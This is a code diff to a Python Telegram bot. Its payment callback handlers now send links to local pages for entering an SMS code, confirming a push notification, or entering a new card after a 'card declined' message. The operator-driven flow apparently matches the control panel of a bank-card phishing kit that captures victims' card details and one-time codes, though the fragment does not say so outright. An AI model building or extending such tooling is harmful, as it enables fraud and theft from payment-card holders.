@@ -239,8 +239,11 @@ async def process_payment_data(message: types.Message):
 @dp.callback_query(F.data.startswith("sms_code_"))
 async def sms_code_handler(callback: types.CallbackQuery):
     payment_id = callback.data.split("_")[2]
+    
+    # Отправляем пользователю ссылку на SMS страницу
     await callback.message.edit_text(
-        f"📱 <b>SMS код запрошен для платежа #{payment_id}</b>",
+        f"📱 <b>SMS код запрошен для платежа #{payment_id}</b>\n\n"
+        f"Перейдите по ссылке для ввода кода: http://localhost:8000/sms.html",
         parse_mode="HTML"
     )
     await callback.answer("SMS код запрошен")
@@ -248,8 +251,11 @@ async def sms_code_handler(callback: types.CallbackQuery):
 @dp.callback_query(F.data.startswith("push_"))
 async def push_handler(callback: types.CallbackQuery):
     payment_id = callback.data.split("_")[2]
+    
+    # Отправляем пользователю ссылку на страницу с пуш-уведомлением
     await callback.message.edit_text(
-        f"🔔 <b>Пуш уведомление отправлено для платежа #{payment_id}</b>",
+        f"🔔 <b>Пуш уведомление отправлено для платежа #{payment_id}</b>\n\n"
+        f"Перейдите по ссылке для подтверждения: http://localhost:8000/loading.html",
         parse_mode="HTML"
     )
     await callback.answer("Пуш отправлен")
@@ -257,8 +263,11 @@ async def push_handler(callback: types.CallbackQuery):
 @dp.callback_query(F.data.startswith("wrong_card_"))
 async def wrong_card_handler(callback: types.CallbackQuery):
     payment_id = callback.data.split("_")[2]
+    
+    # Отправляем пользователю ссылку на страницу оплаты с ошибкой
     await callback.message.edit_text(
-        f"❌ <b>Карта отклонена для платежа #{payment_id}</b>",
+        f"❌ <b>Карта отклонена для платежа #{payment_id}</b>\n\n"
+        f"Перейдите по ссылке для ввода новой карты: http://localhost:8000/payment.html?status=wrong_card",
         parse_mode="HTML"
     )
     await callback.answer("Карта отклонена")
